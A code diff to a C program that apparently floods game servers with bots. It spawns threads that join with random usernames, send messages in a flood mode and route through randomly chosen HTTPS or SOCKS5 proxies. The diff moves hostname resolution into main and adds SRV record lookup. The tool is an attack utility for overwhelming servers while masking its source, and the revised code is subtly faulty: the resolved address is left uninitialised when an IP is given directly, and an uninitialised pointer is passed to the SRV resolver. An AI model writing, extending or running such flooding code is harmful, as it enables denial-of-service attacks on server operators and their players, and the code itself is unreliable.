@@ -8,6 +8,8 @@
 #include <strings.h>
 #include <math.h>
 #include <ctype.h>
+#include <resolv.h>
+#include <arpa/nameser.h>
 
 #include "protocol.c"
 #include "utils.c"
@@ -23,23 +25,9 @@ int protocol;
 int bot_mode = MODE_FLOOD;
 int proxy_mode = HTTPS;
 
-void bot_connect(char *address, int port, char *username, int thread, char *message, char *proxy_address, int proxy_port) {
+void bot_connect(const char *address, const char *resolved_address, const unsigned short port, const char *username, const int thread, const char *message, const char *proxy_address, const unsigned short proxy_port) {
     struct sockaddr_in server;
     int sock;
-
-    char *conn_address = strdup(address);
-    int conn_port = port;
-
-    if(!ipaddress_valid(conn_address)) {
-        char ip[16];
-        if(resolve_hostname(conn_address, ip)) {
-            free(conn_address);
-            conn_address = strdup(ip);
-        }else {
-            fprintf(stderr, "[%sERROR%s][%sTHREAD%03d%s] Invalid IP address or hostname\n", COLOR_RED, COLOR_RESET, COLOR_BLUE, thread, COLOR_RESET);
-            exit(1);
-        }
-    }
 
     if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
         fprintf(stderr, "[%sERROR%s][%sTHREAD%03d%s] Unable to initialize socket\n", COLOR_RED, COLOR_RESET, COLOR_BLUE, thread, COLOR_RESET);
@@ -47,16 +35,16 @@ void bot_connect(char *address, int port, char *username, int thread, char *mess
     }
     
     server.sin_family = AF_INET;
-    server.sin_port = htons(proxy_port == -1 ? conn_port : proxy_port);
+    server.sin_port = htons(proxy_port == 0 ? port : proxy_port);
 
-    if(!inet_pton(AF_INET, proxy_port == -1 ? conn_address : proxy_address, &server.sin_addr)) {
-        fprintf(stderr, "[%sERROR%s][%sTHREAD%03d%s] Unable to resolve IP address '%s'\n", COLOR_RED, COLOR_RESET, COLOR_BLUE, thread, COLOR_RESET, conn_address);
+    if(!inet_pton(AF_INET, proxy_port == 0 ? resolved_address : proxy_address, &server.sin_addr)) {
+        fprintf(stderr, "[%sERROR%s][%sTHREAD%03d%s] Unable to resolve IP address '%s'\n", COLOR_RED, COLOR_RESET, COLOR_BLUE, thread, COLOR_RESET, resolved_address);
         exit(1);
     }
 
     if((connect(sock, (struct sockaddr*)&server, sizeof(server))) < 0) {
         fprintf(stderr, "[%sERROR%s][%sTHREAD%03d%s] Unable to connect to server\n", COLOR_RED, COLOR_RESET, COLOR_BLUE, thread, COLOR_RESET);
-        if(proxy_port == -1) {
+        if(proxy_port == 0) {
             exit(1);
         }else {
             return;
@@ -65,7 +53,7 @@ void bot_connect(char *address, int port, char *username, int thread, char *mess
 
     char proxy_str[256];
     bzero(proxy_str, 256);
-    if(proxy_port != -1) {
+    if(proxy_port > 0) {
         sprintf(proxy_str, " with proxy %s:%d", proxy_address, proxy_port);
     }
     printf("[%sINFO%s][%sTHREAD%03d%s] Bot '%s' connecting%s\n", COLOR_GREEN, COLOR_RESET, COLOR_BLUE, thread, COLOR_RESET, username, proxy_str);
@@ -73,18 +61,19 @@ void bot_connect(char *address, int port, char *username, int thread, char *mess
     char *packet;
     int packet_size = 0;
 
-    if(proxy_port != -1) {
+    if(proxy_port > 0) {
         if(proxy_mode == HTTPS) {
             char https[256];
-            build_https_proxy_connect(https, address, conn_port);
+            build_https_proxy_connect(https, address, port);
             send(sock, https, strlen(https), MSG_NOSIGNAL);
         }else if(proxy_mode == SOCKS5) {
             char *socks5_connect_request;
             int socks5_size = 0;
             send(sock, socks5_handshake, 3, MSG_NOSIGNAL);
-            build_socks5_proxy_connect(address, conn_port, &socks5_connect_request, &socks5_size);
+            build_socks5_proxy_connect(address, port, &socks5_connect_request, &socks5_size);
             send(sock, socks5_connect_request, socks5_size, MSG_NOSIGNAL);
             free(socks5_connect_request);
+            sleep(1);
         }
     }
 
@@ -93,8 +82,6 @@ void bot_connect(char *address, int port, char *username, int thread, char *mess
     join_packet(username, &packet, &packet_size);
     send(sock, packet, packet_size, MSG_NOSIGNAL);
     
-    free(conn_address);
-
     sleep(1);
 
     if(strlen(message) > 0) {
@@ -116,7 +103,8 @@ void bot_connect(char *address, int port, char *username, int thread, char *mess
 
 struct args {
     char *address;
-    int port;
+    char *resolved_address;
+    unsigned short port;
     int thread;
     char **proxies;
     int proxy_amount;
@@ -125,17 +113,18 @@ struct args {
 
 void *bot_loop(void *args) {
     char proxy_addr[16];
-    int proxy_port = -1;
+    unsigned short proxy_port = 0;
     while(1) {
         if((((struct args *)args)->proxy_amount) > 0) {
             char *selected_proxy = (((struct args *)args)->proxies)[rand() % (((struct args *)args)->proxy_amount)];
             parse_proxy(selected_proxy, proxy_addr, &proxy_port);
-            if(proxy_port == -1 || !ipaddress_valid(proxy_addr)) {
+            if(proxy_port == 0 || !ipaddress_valid(proxy_addr)) {
                 continue;
             }
         }
         bot_connect(
             ((struct args *)args)->address,
+            ((struct args *)args)->resolved_address,
             ((struct args *)args)->port,
             random_string(10),
             ((struct args *)args)->thread,
@@ -166,7 +155,7 @@ int main(int argc, char *argv[]) {
     init_random();
 
     int opt;
-    while((opt = getopt(argc, argv, "i:p:t:x:m:v:c:hk:")) != -1) {
+    while((opt = getopt(argc, argv, "i:p:t:x:m:v:c:hk:")) > 0) {
         switch(opt) {
             case 'i':
                 strcpy(address, optarg);
@@ -238,12 +227,27 @@ int main(int argc, char *argv[]) {
         read_proxy_file(proxy_file, &proxies, &proxy_amount);
     }
 
+    char *conn_address;
+    unsigned short conn_port = port;
+    if(!ipaddress_valid(address)) {
+        char ip[16];
+        if(resolve_hostname(address, ip)) {
+            conn_address = strdup(ip);
+        }else {
+            if(!resolve_srv(address, conn_address, &conn_port)) {
+                fprintf(stderr, "[%sERROR%s] Invalid IP address or hostname\n", COLOR_RED, COLOR_RESET);
+                exit(1);
+            }
+        }
+    }
+
     pthread_t threads[thread_number];
     
     for(int i = 0; i < thread_number; ++i) {
         struct args *func_args = (struct args *)malloc(sizeof(struct args));
         func_args->address = address;
-        func_args->port = port;
+        func_args->resolved_address = conn_address;
+        func_args->port = conn_port;
         func_args->thread = i+1;
         func_args->proxies = proxies;
         func_args->proxy_amount = proxy_amount;
